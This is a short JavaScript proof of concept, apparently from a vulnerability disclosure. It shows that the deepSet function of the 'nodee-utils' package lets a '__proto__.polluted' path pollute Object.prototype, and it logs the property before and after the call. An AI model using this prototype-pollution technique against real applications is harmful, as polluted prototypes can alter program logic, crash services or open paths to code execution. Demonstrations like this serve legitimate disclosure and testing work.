var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);